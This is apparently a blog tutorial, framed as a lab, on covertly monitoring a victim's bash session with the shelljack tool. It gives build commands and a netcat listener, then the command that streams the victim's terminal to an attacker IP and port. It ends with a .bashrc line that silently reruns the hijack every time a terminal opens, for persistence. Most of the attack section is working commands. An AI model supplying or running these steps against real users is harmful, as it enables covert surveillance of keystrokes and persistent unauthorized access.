---
title: Persistent monitoring
published: true
---

Today we will be using shelljack to monitor the bash of a victim with persistence.

## [](#header-2)Setting up the lab

We will need an attacking machine with netcat installed and a victim machine with git and [Shelljack](https://github.com/emptymonkey/shelljack).

To install shelljack on the victim's machine:

```bash
git clone https://github.com/emptymonkey/ptrace_do.git
cd ptrace_do
make
cd ..

git clone https://github.com/emptymonkey/ctty.git
cd ctty
make
cd ..

git clone https://github.com/emptymonkey/shelljack.git
cd shelljack
make
```

With these commands we compile shelljack dependencies.

## [](#header-2)Simple attack

We have everything ready, now we are going to test that everything is ok before creating the persistence.

In the attacker's machine we set up a listener:

```bash
nc -lvp Port
```

With this command we are setting up a listener with -l, putting the command in verbose with -v and with -p we are setting up the port.

Now in the victim's machine we have to know the PID (proccess ID) of the tty because shelljack needs it and then execute shelljack:

```bash
tty
./shelljack -n Attacker IP:Port $$
```

With this command we are executing shelljack to connect us to that IP and that port.

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/victim_poc.png)

Now when the victim writes a command, we can see it in our machine.

Victim:

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/victim_poc_1.png)

Attacker:

![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/attacker_poc_1.png)

## [](#header-2)Applying persistence

To apply the persistence we have to modify .bashrc in the victim's machine and add this:

```bash
tty &>/dev/null; /home/code/shelljack/shelljack -n Attacker IP:Port $$ &>/dev/null
```

What is inside .bashrc will be executed every time the user opens a terminal, so if we put the command to connect with shelljack, we will get persistence.
